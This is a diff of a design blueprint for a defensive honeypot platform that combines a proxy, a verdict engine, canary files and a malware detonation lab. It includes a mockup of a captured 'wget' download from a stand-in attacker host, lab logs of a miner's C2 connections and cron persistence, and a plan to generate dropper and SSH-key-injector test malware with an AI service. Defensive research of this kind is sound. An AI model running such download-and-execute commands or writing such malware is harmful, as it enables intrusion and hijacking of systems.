@@ -1,5 +1,5 @@
 # STING 2.0 — Deception Platform Blueprint
-**Version:** 2.0-DRAFT | **Date:** 2026-02-28 | **Author:** Falke AI
+**Version:** 2.0-DRAFT-r2 | **Date:** 2026-02-28 | **Author:** Falke AI
 
 ---
 
@@ -8,453 +8,537 @@
 ```
 STING 1.0 (current)          STING 2.0 (proposed)
 ─────────────────────         ──────────────────────────────────────
-Cowrie logs → parse           Active deception layer (overlay FS)
-→ analyze → alert             + Canary tokens + Malware capture
-                              + Lab pipeline + Pattern analysis
+Cowrie logs → parse           Transparent proxy overlay
+→ analyze → alert             + Verdict engine (hostile-until-cleared)
+                              + Userspace virtual FS
+                              + Real-time malware lab
                               + Full web UI + REST API
-Passive observer              Active trap operator
+Passive observer              Active deception operator
 ```
 
 ---
 
-## 2. ARCHITECTURE OVERVIEW
+## 2. CORE DESIGN PRINCIPLE
+
+**Hostile Until Cleared.**
+
+Every connection is treated as hostile by default. STING owns the public ports. Real services run internally. The proxy decides in real-time what each session sees.
 
 ```
-┌─────────────────────────────────────────────────────────────────────┐
-│                         INTERNET / ATTACKERS                        │
-└──────────────────────────────┬──────────────────────────────────────┘
-                               │
-              ┌────────────────▼────────────────┐
-              │         TRAP LAYER (CT100)       │
-              │  ┌──────────┐  ┌──────────────┐  │
-              │  │  Cowrie  │  │  OverlayFS   │  │
-              │  │ SSH/Tel  │  │  Fake Trees  │  │
-              │  └────┬─────┘  └──────┬───────┘  │
-              │       │  Canary Tokens │          │
-              │       └───────┬────────┘          │
-              └───────────────┼───────────────────┘
-                              │ events + captures
-              ┌───────────────▼───────────────────┐
-              │        STING BACKEND API           │
-              │         (CT102: FastAPI)           │
-              │  /trap  /canary  /samples          │
-              │  /lab   /analyze /export           │
-              └───────┬───────────────┬────────────┘
-                      │               │
-          ┌───────────▼──┐    ┌───────▼──────────┐
-          │  STING UI    │    │   LAB PIPELINE   │
-          │  (CT102:     │    │   (CT102:        │
-          │   React)     │    │    isolated net) │
-          │              │    │  Detonation +    │
-          │  Dashboard   │    │  Behavior analysis│
-          │  Trap Mgmt   │    │  Pattern extract │
-          │  Sample View │    │  YARA generation │
-          │  Lab Results │    └──────────────────┘
-          └──────────────┘
+BEFORE (direct exposure):
+Internet → :22   → sshd (real)
+Internet → :80   → nginx (real)
+Internet → :5432 → postgres (real)
+
+AFTER (STING overlay):
+Internet → :22   → STING PROXY ─→ verdict engine
+Internet → :80   → STING PROXY ─→ verdict engine
+Internet → :5432 → STING PROXY ─→ verdict engine
+                        │
+                   HOSTILE │ CLEARED
+                        ↓       ↓
+                   Trap layer  Passthrough
+                   Fake shell  :22022 sshd
+                   Canaries    :8081 nginx
+                   Capture     :6432 postgres
+
+Real services untouched. Just moved to internal ports.
+```
+
+**No kernel code. No OverlayFS. No eBPF. Pure userspace.**
+
+Research confirms this approach is novel — no existing open-source tool combines:
+1. Transparent proxy overlay over real services
+2. Verdict-based hostile-until-cleared scoring
+3. Dynamic passthrough to real backend
+4. Real-time malware lab with syscall streaming
+
+Closest existing: Honeytrap (proxy capability, no verdict). Cowrie (SSH deception, no proxy/passthrough).
+
+---
+
+## 3. ARCHITECTURE
+
+```
+┌───────────────────────────────────────────────────────────────────┐
+│                         INTERNET                                  │
+└──────────────────────────┬────────────────────────────────────────┘
+                           │ all traffic
+              ┌────────────▼────────────────┐
+              │      STING PROXY LAYER       │
+              │   (userspace, per-protocol)  │
+              │                             │
+              │  SSH proxy  (asyncssh :22)  │
+              │  HTTP proxy (fastapi  :80)  │
+              │  TCP proxy  (generic  :any) │
+              └──────────┬──────────────────┘
+                         │
+              ┌──────────▼──────────────────┐
+              │      VERDICT ENGINE          │
+              │                             │
+              │  session score (0-100)      │
+              │  100 = hostile (default)    │
+              │  drops on clean behavior    │
+              │  spikes on hostile patterns │
+              └───┬───────────────┬─────────┘
+                  │               │
+          HOSTILE │               │ CLEARED
+                  ▼               ▼
+        ┌─────────────┐   ┌──────────────────┐
+        │ TRAP LAYER  │   │ REAL SERVICES    │
+        │             │   │                  │
+        │ Virtual FS  │   │ sshd  :22022     │
+        │ Fake shell  │   │ nginx :8081      │
+        │ Canary files│   │ any   :X+1000    │
+        │ Fake creds  │   │                  │
+        │ Capture hook│   │ (transparent,    │
+        │             │   │  session still   │
+        └──────┬──────┘   │  monitored)      │
+               │          └──────────────────┘
+               ▼
+        ┌─────────────────────────────┐
+        │      STING BACKEND API      │
+        │      (FastAPI :8700)        │
+        │                             │
+        │  /events  /samples  /lab    │
+        │  /canary  /verdict  /export │
+        └──────────┬──────────────────┘
+                   │
+        ┌──────────▼──────────────────┐
+        │      STING FRONTEND UI      │
+        │      (React :8701)          │
+        │                             │
+        │  Dashboard  │  Lab View     │
+        │  Trap Mgmt  │  Sample View  │
+        └─────────────────────────────┘
+                   │
+        ┌──────────▼──────────────────┐
+        │      MALWARE LAB            │
+        │  (isolated Docker network)  │
+        │                             │
+        │  Victim container           │
+        │  Monitoring sidecar         │
+        │  Real-time syscall stream   │
+        │  WebSocket → frontend       │
+        └─────────────────────────────┘
 ```
 
 ---
 
-## 3. COMPONENTS
+## 4. VERDICT ENGINE
 
-### 3.1 Trap Layer (OverlayFS + Canaries)
-
-The deception surface — what attackers see and touch.
+Real-time scoring. Every session starts at 100 (hostile).
 
 ```
-OVERLAYFS DESIGN:
-                                                
-  Real FS (lower layer, read-only)              
-  ┌─────────────────────────────┐               
-  │ /etc/passwd (real)          │               
-  │ /var/www/html (real)        │               
-  │ /home/admin/ (real)         │               
-  └─────────────────────────────┘               
-              +                                 
-  Fake Layer (upper layer, trap content)        
-  ┌─────────────────────────────┐               
-  │ /home/admin/.ssh/keys  🍯  │ ← canary file 
-  │ /root/secrets.txt      🍯  │ ← canary file 
-  │ /var/backups/db.sql    🍯  │ ← canary file 
-  │ /etc/shadow (fake)     🍯  │ ← fake creds  
-  │ /opt/app/config.yaml   🍯  │ ← fake API key
-  └─────────────────────────────┘               
-              =                                 
-  Attacker View (merged)                        
-  ┌─────────────────────────────┐               
-  │ Looks 100% like real system │               
-  │ Every canary access logged  │               
-  │ Every credential trapped    │               
-  └─────────────────────────────┘               
+SCORE EVENTS:
+
+Drops (toward cleared):
+  Successful auth (known-good cred)    -30
+  Normal file access (non-canary)       -5 per action
+  Normal commands (ls, cd, cat)         -2 per command
+  No recon patterns after 30s          -20
+  Clean for 60s continuous             -20
+
+Spikes (stay/return hostile):
+  Failed auth attempt                  +15
+  Canary file accessed                 +50  (flags session permanently)
+  wget/curl to executable              +80  (flags permanently)
+  /etc/passwd read                     +25
+  uname+id+whoami combo (recon seq)    +40
+  Known bad IP (threat intel)          +100 (irrecoverable)
+  Binary execution from /tmp           +60
+
+Passthrough threshold:  score < 30
+Re-hostile threshold:   score > 50 (yanks passthrough mid-session)
 ```
 
-**Canary Types:**
-
-| Type | Trigger | Example |
-|------|---------|---------|
-| File canary | `open()` / `read()` syscall | `/root/secrets.txt` |
-| Credential canary | Login attempt with fake creds | `admin:SuperSecret2024!` |
-| URL canary | HTTP request to beacon URL | `http://trap.sting/beacon?id=X` |
-| Doc canary | Open PDF/Office with embedded pixel | Fake invoice with tracking pixel |
-| DNS canary | DNS lookup of unique subdomain | `id123.canary.sting.local` |
-| Token canary | AWS key / API key beacon | Fake AWS access key |
-
-### 3.2 Backend API (FastAPI)
-
-**Base URL:** `http://CT102:8700/api/v1`
+**Session state machine:**
 
 ```
-REST API STRUCTURE:
-
-/api/v1/
-├── /trap
-│   ├── GET    /status          — trap health, active sessions
-│   ├── POST   /canary          — deploy new canary
-│   ├── DELETE /canary/{id}     — remove canary
-│   ├── GET    /canaries        — list all canaries + hit stats
-│   └── GET    /sessions        — active/recent attacker sessions
-│
-├── /events
-│   ├── GET    /                — event stream (SSE / websocket)
-│   ├── GET    /{id}            — single event detail
-│   ├── GET    /search          — query events
-│   └── GET    /stats           — aggregated statistics
-│
-├── /samples
-│   ├── GET    /                — list captured malware samples
-│   ├── GET    /{hash}          — sample detail + metadata
-│   ├── POST   /submit          — manual sample submission
-│   ├── GET    /{hash}/download — download sample (auth required)
-│   └── DELETE /{hash}          — remove sample
-│
-├── /lab
-│   ├── POST   /detonate/{hash} — trigger dynamic analysis
-│   ├── GET    /jobs            — analysis queue + status
-│   ├── GET    /results/{hash}  — analysis results
-│   ├── GET    /patterns        — extracted behavior patterns
-│   └── GET    /yara/{hash}     — generated YARA rule
-│
-├── /overlay
-│   ├── GET    /status          — overlay FS mount status
-│   ├── POST   /deploy          — push new fake file tree
-│   ├── PUT    /file            — add/update fake file
-│   └── DELETE /file            — remove fake file
-│
-└── /export
-    ├── GET    /mitre/{hash}    — MITRE ATT&CK mapping
-    ├── GET    /report/{hash}   — full PDF report
-    └── GET    /ioc             — IOC feed (IPs, hashes, domains)
-```
-
-### 3.3 Frontend UI (Mockups)
-
-```
-╔══════════════════════════════════════════════════════════════════╗
-║  ◈ STING  [ TRAP ] [ EVENTS ] [ SAMPLES ] [ LAB ] [ EXPORT ]   ║
-╠══════════════════════════════════════════════════════════════════╣
-║                                                                  ║
-║  THREAT MAP                    LIVE FEED                        ║
-║  ┌──────────────────────┐      ┌───────────────────────────┐   ║
-║  │   ·   ·  ●  ·    ·  │      │ 🔴 18:41 MALWARE_DL       │   ║
-║  │  ·  ●      ·  ·     │      │    218.92.0.51 → miner.sh  │   ║
-║  │    ·   ●  ·   ·  ·  │      │ 🟠 18:40 CANARY_HIT       │   ║
-║  │  ·    ·      ●  ·   │      │    /root/secrets.txt read  │   ║
-║  └──────────────────────┘      │ 🟡 18:39 BRUTE_FORCE      │   ║
-║                                │    192.168.1.1 × 47 tries  │   ║
-║  STATS (24h)                   │ 🔴 18:38 SUCCESS_LOGIN    │   ║
-║  ┌──────────┬──────────┐       │    root / admin123        │   ║
-║  │ Sessions │ 142      │       └───────────────────────────┘   ║
-║  │ Captures │ 8        │                                        ║
-║  │ Canaries │ 23 hits  │      CANARY STATUS                    ║
-║  │ Samples  │ 3 new    │      ┌───────────────────────────┐   ║
-║  └──────────┴──────────┘       │ /root/secrets.txt   5 🔴 │   ║
-║                                │ /etc/shadow (fake)  12 🔴│   ║
-║                                │ db_backup.sql        3 🟠│   ║
-║                                │ aws_keys.conf        0 ⬜ │   ║
-║                                └───────────────────────────┘   ║
-╚══════════════════════════════════════════════════════════════════╝
-
-SAMPLE DETAIL VIEW:
-╔══════════════════════════════════════════════════════════════════╗
-║  ◈ STING / SAMPLES / a1b2c3d4e5f6...                           ║
-╠══════════════════════════════════════════════════════════════════╣
-║  miner.sh                          [ DETONATE ] [ YARA ] [PDF] ║
-║  ──────────────────────────────────────────────────────────────║
-║  Captured:  2026-02-28 18:41 UTC                               ║
-║  Source:    218.92.0.51 (CN, AS4134)                           ║
-║  Vector:    wget http://evil.cn/miner.sh                       ║
-║  SHA256:    a1b2c3d4...                                         ║
-║  Size:      4.2 KB | Type: shell script                        ║
-║                                                                  ║
-║  BEHAVIOR (Lab Results)          MITRE ATT&CK                  ║
-║  ┌────────────────────────┐      ┌──────────────────────────┐  ║
-║  │ Network: 3 C2 connects │      │ T1059.004 Shell Script   │  ║
-║  │ Files:   +2 created    │      │ T1496    Crypto Mining   │  ║
-║  │ Procs:   5 spawned     │      │ T1105    Ingress Tool    │  ║
-║  │ Persistence: cron job  │      │ T1053.003 Cron Job       │  ║
-║  └────────────────────────┘      └──────────────────────────┘  ║
-║                                                                  ║
-║  EXTRACTED IOCs                                                  ║
-║  ┌──────────────────────────────────────────────────────────┐  ║
-║  │ 218.92.0.51          │ C2 server        │ 🚫 Block      │  ║
-║  │ pool.minexmr.com     │ Mining pool      │ 🚫 Block      │  ║
-║  │ /tmp/.x              │ Hidden process   │ 📋 Rule       │  ║
-║  └──────────────────────────────────────────────────────────┘  ║
-╚══════════════════════════════════════════════════════════════════╝
-
-LAB ANALYSIS VIEW:
-╔══════════════════════════════════════════════════════════════════╗
-║  ◈ STING / LAB / Job #047                     ⣿⣿⣿⣿⣿⣿⣿⣿ 100% ║
-╠══════════════════════════════════════════════════════════════════╣
-║  TIMELINE                                                        ║
-║  ──────────────────────────────────────────────────────────────║
-║  00:00  [EXEC]    /bin/sh miner.sh                              ║
-║  00:01  [NET]     DNS lookup: pool.minexmr.com → 45.63.xx.xx   ║
-║  00:01  [FILE]    Created: /tmp/.xmrig                          ║
-║  00:02  [NET]     TCP connect: 45.63.xx.xx:4444                 ║
-║  00:02  [PROC]    Spawned: .xmrig --pool pool.minexmr.com       ║
-║  00:03  [PERSIST] crontab -l | crontab - (added entry)          ║
-║  00:03  [CLEANUP] rm -f miner.sh                                ║
-║                                                                  ║
-║  GENERATED YARA RULE                                             ║
-║  ┌──────────────────────────────────────────────────────────┐  ║
-║  │ rule STING_miner_a1b2 {                                  │  ║
-║  │   strings:                                               │  ║
-║  │     $s1 = "pool.minexmr.com"                            │  ║
-║  │     $s2 = "/tmp/.xmrig"                                  │  ║
-║  │     $s3 = "xmrig --pool"                                 │  ║
-║  │   condition: 2 of them                                   │  ║
-║  │ }                                                        │  ║
-║  └──────────────────────────────────────────────────────────┘  ║
-╚══════════════════════════════════════════════════════════════════╝
+HOSTILE (100) ──[clean behavior]──→ PENDING ──[threshold]──→ CLEARED
+    ↑                                                            │
+    └──────────────[hostile pattern detected]────────────────────┘
 ```
 
 ---
 
-## 4. MALWARE TRANSFER PIPELINE
+## 5. PROXY IMPLEMENTATIONS
 
-The core innovation — seamless trap → lab handoff.
+### SSH Proxy (asyncssh)
 
+```python
+class StingSSHProxy(asyncssh.SSHServer):
+    
+    async def on_connect(self, conn):
+        session = Session(conn.get_extra_info('peername'))
+        session.score = 100  # hostile by default
+        
+    async def auth_attempt(self, user, password):
+        self.session.score_event('AUTH_ATTEMPT', +15)
+        if is_known_good(user, password):
+            self.session.score_event('AUTH_SUCCESS', -30)
+            return True
+        # Always accept — attacker gets fake shell
+        return True
+    
+    async def get_shell(self):
+        if self.session.score < 30:
+            # Cleared — proxy to real sshd
+            return await proxy_to_real(self.real_host, self.real_port)
+        else:
+            # Hostile — serve virtual shell
+            return StingVirtualShell(self.session)
+
+class StingVirtualFS:
+    CANARY_FILES = {
+        '/root/secrets.txt':      ('db_pass=Sup3rS3cr3t!', 'CANARY'),
+        '/etc/shadow':            (fake_shadow,             'CANARY'),
+        '/home/admin/.ssh/id_rsa': (fake_privkey,           'CANARY'),
+        '/var/backups/db.sql':    (fake_sql_dump,           'CANARY'),
+    }
+    # All other paths: serve realistic fake content
+    # Writes: accepted silently, never persist
 ```
-TRANSFER FLOW:
 
-  TRAP ENV (CT100)              STING API              LAB ENV (CT102)
-  ──────────────                ─────────              ───────────────
-  Attacker uploads              Receives               Isolated Docker
-  or downloads                  sample via             network (no
-  malware.sh                    audit hook             internet access)
-       │                              │                      │
-       ▼                              ▼                      ▼
-  [1] CAPTURE                  [2] QUARANTINE          [3] DETONATE
-  fanotify/inotify             Hash + sign             Spin up clean
-  intercepts file              Store in                container from
-  write to FS                  samples/ dir            base image
-       │                              │                      │
-       ▼                              ▼                      ▼
-  [4] METADATA                 [5] ENRICH              [6] ANALYZE
-  Source IP,                   VirusTotal API          strace -e all
-  session ID,                  (optional)              tcpdump
-  timestamp,                   File type               ltrace
-  vector (wget/curl)           Entropy score           procmon
-       │                              │                      │
-       ▼                              ▼                      ▼
-  [7] ALERT                    [8] STORE               [9] REPORT
-  Telegram: new                SQLite +                Pattern extract
-  sample captured              file storage            YARA rule gen
-                                                       MITRE mapping
-                                                       IOC export
+### HTTP Proxy (nginx + lua verdict check)
+
+```nginx
+location / {
+    access_by_lua_block {
+        local verdict = get_verdict(ngx.var.remote_addr)
+        if verdict == "hostile" then
+            -- serve trap response (fake login, canary page)
+            ngx.exec("@sting_trap")
+        end
+        -- cleared: fall through to real backend
+    }
+    proxy_pass http://127.0.0.1:8081;
+}
 ```
 
-### Transfer Security
+### Generic TCP Proxy (Go)
 
-```
-Sample bundle (encrypted):
-┌────────────────────────────────┐
-│ manifest.json                  │
-│   sha256: "a1b2c3..."          │
-│   size: 4200                   │
-│   source_ip: "218.92.0.51"    │
-│   captured_at: "2026-02-28..." │
-│   vector: "wget"               │
-├────────────────────────────────┤
-│ sample.bin (AES-256 encrypted) │
-├────────────────────────────────┤
-│ signature (Ed25519)            │
-└────────────────────────────────┘
+```go
+// For any service STING doesn't have a specific proxy for
+// Bind to :X, proxy to :X+1000 if cleared, else serve trap
+func handleConn(c net.Conn) {
+    session := verdict.GetSession(c.RemoteAddr())
+    if session.Score < 30 {
+        proxyTo(c, realPort)
+    } else {
+        serveTrap(c, session)
+    }
+}
 ```
 
 ---
 
-## 5. LAB ENVIRONMENT
+## 6. CANARY SYSTEM
+
+Canaries are tripwires embedded in the fake layer.
+
+| Canary Type | Trigger | Score Impact |
+|-------------|---------|-------------|
+| File canary | read/open on fake file | +50, permanent flag |
+| Credential canary | login with fake cred | +60, permanent flag |
+| URL canary | HTTP GET to beacon URL | alert only (external) |
+| Token canary | AWS key / API key used | alert only (external) |
+| DNS canary | lookup of unique subdomain | alert only (external) |
+
+URL/token/DNS canaries beacon back to STING API even if attacker uses the credential from *outside* the trap environment. Out-of-band detection.
+
+---
+
+## 7. MALWARE LAB — REAL-TIME ANALYSIS
+
+The core innovation: not just capture and report — watch it run live.
+
+### Architecture
 
 ```
-LAB NETWORK (isolated):
-
+DETONATION:
+Malware sample
+      │
+      ▼
 ┌─────────────────────────────────────────────────────┐
-│  STING LAB NETWORK (172.31.0.0/24, no route out)   │
+│  ISOLATED DOCKER NETWORK (172.31.0.0/24)            │
+│  No route to internet. Fake services only.          │
 │                                                     │
 │  ┌──────────────────┐    ┌─────────────────────┐   │
 │  │  VICTIM CONTAINER │    │  MONITORING SIDECAR │   │
-│  │  (fresh base img) │    │                     │   │
-│  │                  │───▶│  strace output      │   │
-│  │  Malware runs    │    │  tcpdump capture    │   │
-│  │  here in         │    │  inotify events     │   │
-│  │  isolation       │    │  proc monitoring    │   │
-│  │                  │    │  cgroup tracking    │   │
-│  └──────────────────┘    └─────────────────────┘   │
-│           │                        │                │
-│           └───────────┬────────────┘                │
-│                       │                             │
-│              ┌────────▼────────┐                    │
-│              │  FAKE SERVICES  │                    │
-│              │  DNS resolver   │                    │
-│              │  (logs queries) │                    │
-│              │  HTTP server    │                    │
-│              │  (logs requests)│                    │
-│              │  SMTP sink      │                    │
-│              └─────────────────┘                    │
-└─────────────────────────────────────────────────────┘
-         Results stream to STING API
+│  │                  │    │                     │   │
+│  │  Clean base img  │◄───│  strace -f -e all   │   │
+│  │  Malware runs    │    │  tshark -i any      │   │
+│  │  here            │    │  inotifywait -m -r  │   │
+│  │                  │    │  pspy64             │   │
+│  │                  │    │  ss -tlnp poll      │   │
+│  └──────────────────┘    └──────────┬──────────┘   │
+│                                     │               │
+│           ┌─────────────────────────┘               │
+│           │ event streams                           │
+│           ▼                                         │
+│  ┌─────────────────────┐                            │
+│  │  FAKE SERVICES      │                            │
+│  │  DNS (logs queries) │                            │
+│  │  HTTP (logs reqs)   │                            │
+│  │  SMTP sink          │                            │
+│  └─────────────────────┘                            │
+└──────────────────────┬──────────────────────────────┘
+                       │ WebSocket stream
+                       ▼
+                 STING API → Frontend
 ```
 
-**Analysis tools per container:**
+### Real-Time Streams (WebSocket)
 
-| Tool | Purpose |
-|------|---------|
-| `strace -e trace=all` | All syscalls |
-| `tcpdump -i any` | All network |
-| `inotifywait` | File system changes |
-| `ss -tlnp` | Port binds |
-| `strings` | Static string extract |
-| `entropy scan` | Packed/encrypted detection |
-| YARA engine | Signature matching |
+Four parallel streams pushed live to frontend:
+
+```
+STREAM 1: SYSCALLS
+{ "t": 0.001, "pid": 1234, "call": "openat",   "args": ["/etc/passwd"], "ret": 3 }
+{ "t": 0.002, "pid": 1234, "call": "read",      "args": [3, 4096],       "ret": 1024 }
+{ "t": 0.003, "pid": 1234, "call": "execve",    "args": ["/tmp/.x"],     "ret": 0 }
+{ "t": 0.004, "pid": 1235, "call": "connect",   "args": ["45.63.x.x:4444"], "ret": 0 }
+
+STREAM 2: NETWORK
+{ "t": 0.001, "type": "dns",  "query": "pool.minexmr.com" }
+{ "t": 0.002, "type": "tcp",  "dst": "45.63.x.x:4444", "syn": true }
+{ "t": 0.004, "type": "data", "dst": "45.63.x.x:4444", "bytes": 256 }
+
+STREAM 3: FILESYSTEM
+{ "t": 0.001, "event": "CREATE", "path": "/tmp/.xmrig" }
+{ "t": 0.003, "event": "MODIFY", "path": "/var/spool/cron/root" }
+{ "t": 0.004, "event": "DELETE", "path": "/tmp/miner.sh" }
+
+STREAM 4: PROCESSES
+{ "t": 0.000, "event": "SPAWN",  "pid": 1234, "cmd": "/bin/sh miner.sh" }
+{ "t": 0.003, "event": "SPAWN",  "pid": 1235, "cmd": "/tmp/.xmrig --pool ..." }
+{ "t": 0.003, "event": "SPAWN",  "pid": 1236, "cmd": "crontab -" }
+```
+
+### Live Lab UI
+
+```
+╔══════════════════════════════════════════════════════════════════════╗
+║  ◈ STING / LAB / miner.sh  [▶ RUNNING 00:03]  [⏸ PAUSE] [⏹ STOP] ║
+╠══════════════════════════════════════════════════════════════════════╣
+║  SYSCALLS                    NETWORK                                 ║
+║  ┌─────────────────────┐     ┌───────────────────────────────────┐  ║
+║  │openat /etc/passwd   │     │→ DNS pool.minexmr.com             │  ║
+║  │read fd=3 1024b      │     │→ TCP 45.63.x.x:4444 SYN           │  ║
+║  │execve /tmp/.xmrig   │🔴   │← SYN-ACK                          │  ║
+║  │connect 45.63.x.x   │🔴   │→ DATA 256b                        │  ║
+║  │write crontab        │🔴   └───────────────────────────────────┘  ║
+║  └─────────────────────┘                                            ║
+║                                                                      ║
+║  PROCESS TREE                FILESYSTEM DIFF                        ║
+║  ┌─────────────────────┐     ┌───────────────────────────────────┐  ║
+║  │ sh (1234)           │     │ + /tmp/.xmrig                     │  ║
+║  │ └─ .xmrig (1235) 🔴│     │ ~ /var/spool/cron/root            │🔴║
+║  │ └─ crontab (1236)🔴│     │ - /tmp/miner.sh                   │  ║
+║  └─────────────────────┘     └───────────────────────────────────┘  ║
+║                                                                      ║
+║  TIMELINE ──────────────────────────────────────────────────────   ║
+║  0s    1s    2s    3s    4s    5s    6s    7s    8s    9s    10s    ║
+║  EXEC  ──── NET ─── PERSIST ─── CLEAN                              ║
+╚══════════════════════════════════════════════════════════════════════╝
+```
+
+### On-Demand Deep Inspection
+
+During live session, analyst can:
+
+```bash
+# Dump process memory
+/proc/{pid}/mem → strings + entropy scan → detect packed payload
+
+# Inspect open file descriptors
+/proc/{pid}/fd/* → what files/sockets is it holding
+
+# Read memory maps
+/proc/{pid}/maps → which libraries loaded, code regions
+
+# Freeze + inspect (SIGSTOP)
+kill -STOP {pid} → snapshot state → manual inspection → SIGCONT
+
+# Container checkpoint (CRIU)
+criu dump -t {pid} → full state snapshot → resume later
+```
+
+All accessible from lab UI with one click.
 
 ---
 
-## 6. IMPLEMENTATION ROADMAP
+## 8. POST-ANALYSIS INTELLIGENCE
+
+After detonation completes:
+
+```
+Raw streams
+     │
+     ▼
+PATTERN EXTRACTOR
+     │
+     ├── YARA rule (from strings + behavior)
+     ├── MITRE ATT&CK mapping (syscall patterns → techniques)
+     ├── IOC list (IPs, domains, hashes, paths)
+     └── Behavioral signature (for future detection)
+     │
+     ▼
+STING DB (PostgreSQL)
+     │
+     ├── Searchable sample vault
+     ├── Pattern clustering (similar behaviors grouped)
+     └── IOC feed (exportable JSON/STIX)
+```
+
+**Auto-generated YARA rule:**
+
+```
+rule STING_a1b2c3 {
+  meta:
+    description = "Auto-generated by STING lab"
+    date = "2026-02-28"
+    hash = "a1b2c3..."
+  strings:
+    $s1 = "pool.minexmr.com"
+    $s2 = "/tmp/.xmrig"
+    $s3 = "--pool"
+    $net1 = { 45 63 xx xx }  // C2 IP pattern
+  condition:
+    2 of ($s*) or $net1
+}
+```
+
+---
+
+## 9. TECH STACK
+
+| Layer | Tech | Reason |
+|-------|------|--------|
+| SSH proxy | asyncssh (Python) | Full SSHv2, shell + SFTP hooks |
+| HTTP proxy | nginx + lua / FastAPI middleware | Flexible verdict injection |
+| TCP proxy | Go net package | Performance, simplicity |
+| Backend API | FastAPI (Python) | Matches existing codebase |
+| Frontend | React + Vite | Component-based, WebSocket support |
+| Database | PostgreSQL | Concurrent writes, JSONB for events |
+| Real-time | WebSocket (native FastAPI) | Four parallel event streams |
+| Lab containers | Docker + custom network | Isolation, snapshots |
+| Syscall capture | strace -f | Reliable, no kernel module |
+| Network capture | tshark | Deep protocol decode |
+| FS monitoring | inotifywait | Userspace, no kernel |
+| Process watch | pspy64 | No root required |
+| Memory inspect | /proc/{pid}/mem | Native Linux |
+
+**All userspace. Zero kernel modules.**
+
+---
+
+## 10. COWRIE — DEMOTED
+
+Cowrie no longer in critical path. Reasons:
+- Detectable (timing artifacts, incomplete command set, honeyfs signatures)
+- No verdict engine support
+- SSH/Telnet only
+- Conflicts with our virtual FS layer
+
+**New role:** Port 2222, passive logger only. Feeds STING event stream as one signal among many. Useful as secondary attractor — unsophisticated scanners hit it first.
+
+---
+
+## 11. IMPLEMENTATION ROADMAP
 
 ### Phase 1 — Foundation (Week 1-2)
 ```
-[ ] Backend API skeleton (FastAPI, CT102:8700)
-[ ] Database schema (PostgreSQL — migrate from SQLite)
-[ ] Frontend shell (React, CT102:8701)
-[ ] Auth layer (JWT, single-user for now)
-[ ] Wire existing Cowrie pipeline to new API
-[ ] Basic event stream (WebSocket)
+[ ] FastAPI backend skeleton (CT102:8700)
+[ ] PostgreSQL schema (sessions, events, samples, verdicts, lab_jobs)
+[ ] React frontend shell (CT102:8701)
+[ ] JWT auth (single-user)
+[ ] WebSocket event bus
+[ ] Wire existing Cowrie logs to new API (backward compat)
 ```
 
-### Phase 2 — Canary System (Week 2-3)
+### Phase 2 — Proxy + Verdict Engine (Week 2-3)
 ```
-[ ] OverlayFS deployment script (CT100)
-[ ] Canary file management API
-[ ] Canary hit detection (inotify + auditd)
-[ ] Credential canary wiring (Cowrie fake-cred config)
-[ ] URL canary beacon server
-[ ] Canary dashboard UI
-```
-
-### Phase 3 — Sample Capture (Week 3-4)
-```
-[ ] fanotify capture hook on trap FS
-[ ] Secure transfer bundle (AES + Ed25519)
-[ ] Quarantine + hash dedup
-[ ] VirusTotal enrichment (optional)
-[ ] Sample browser UI
-[ ] Manual submit endpoint
+[ ] asyncssh SSH proxy with session tracking
+[ ] Verdict engine (score state machine)
+[ ] Virtual FS (canary files + fake content)
+[ ] Fake shell (basic command responses)
+[ ] HTTP proxy middleware (nginx lua)
+[ ] Passthrough to real services on verdict
 ```
 
-### Phase 4 — Lab Pipeline (Week 4-5)
+### Phase 3 — Canary System (Week 3-4)
+```
+[ ] Canary file management API + UI
+[ ] File canary hit detection
+[ ] Credential canary (fake creds in virtual FS)
+[ ] URL/DNS/token canary beacon server
+[ ] Canary dashboard (hit stats per canary)
+```
+
+### Phase 4a — Lab Foundation (Week 4)
 ```
 [ ] Isolated Docker network setup
 [ ] Victim container base image
-[ ] Monitoring sidecar (strace/tcpdump)
-[ ] Fake DNS/HTTP services
-[ ] Analysis result parser
-[ ] YARA rule generator
+[ ] Monitoring sidecar (strace + tshark + inotifywait + pspy)
+[ ] Fake DNS/HTTP services (sink)
+[ ] Raw stream collector → STING API
+[ ] Detonation API endpoint
+```
+
+### Phase 4b — Real-Time Lab UI (Week 5)
+```
+[ ] WebSocket stream → frontend
+[ ] Live syscall feed
+[ ] Live network feed
+[ ] Live filesystem diff
+[ ] Process tree view
+[ ] Timeline visualization
+[ ] Pause/freeze controls (/proc SIGSTOP)
+[ ] Memory inspect viewer (/proc/{pid}/mem)
 ```
 
 ### Phase 5 — Intelligence (Week 5-6)
 ```
-[ ] MITRE ATT&CK mapper
+[ ] YARA rule generator (auto from strings + behavior)
+[ ] MITRE ATT&CK mapper (syscall patterns → techniques)
+[ ] IOC extractor (IPs, domains, hashes, paths)
 [ ] Pattern clustering (similar behaviors)
-[ ] IOC export (JSON / STIX)
 [ ] PDF report generator
-[ ] Behavioral timeline UI
-[ ] Real-time lab analysis stream
+[ ] IOC feed export (JSON / STIX)
 ```
 
 ### Phase 6 — Production Test (Week 6-7)
 ```
 [ ] Deploy on CT102 (dev)
-[ ] Wire to CT100 (live Cowrie)
-[ ] Test with malware-by-Falke (generated via Venice)
-[ ] Tune detection thresholds
-[ ] Load test (simulated attack campaign)
-[ ] Harden API (rate limit, auth, input validation)
-[ ] Deploy to prod (CT100 live, CT102 API+UI)
+[ ] Wire to CT100 Cowrie as test input
+[ ] Generate test malware via Venice (8 samples)
+[ ] Full pipeline: capture → detonate → lab → intelligence
+[ ] Load test (simulated campaign)
+[ ] Harden API
+[ ] Production deploy
 ```
 
 ---
 
-## 7. TECH STACK
+## 12. TEST MALWARE PLAN (Venice-generated)
 
-| Layer | Tech | Why |
-|-------|------|-----|
-| Backend API | FastAPI (Python) | Matches existing codebase, async, OpenAPI auto-docs |
-| Frontend | React + Vite | Fast, component-based |
-| Database | PostgreSQL | Scales better than SQLite for concurrent writes |
-| Real-time | WebSocket (native FastAPI) | Live event feed |
-| Lab containers | Docker + custom network | Isolation, clean snapshots |
-| Crypto | PyNaCl (Ed25519) | Sample signing |
-| Deception FS | OverlayFS (kernel) | Zero-cost fake layer |
-| Canary traps | fanotify + auditd | Reliable file access detection |
-| Analysis | strace + Scapy + inotify | Standard Linux tools |
-| YARA | yara-python | Industry standard |
+Before prod, test with AI-generated samples:
 
----
+| Sample | Behavior | Test objective |
+|--------|----------|---------------|
+| Shell dropper | wget + chmod + exec | Capture + detonation |
+| SSH key injector | /root/.ssh/authorized_keys write | Persistence detection |
+| Crypto miner | XMRig-style, pool connect | Network + process stream |
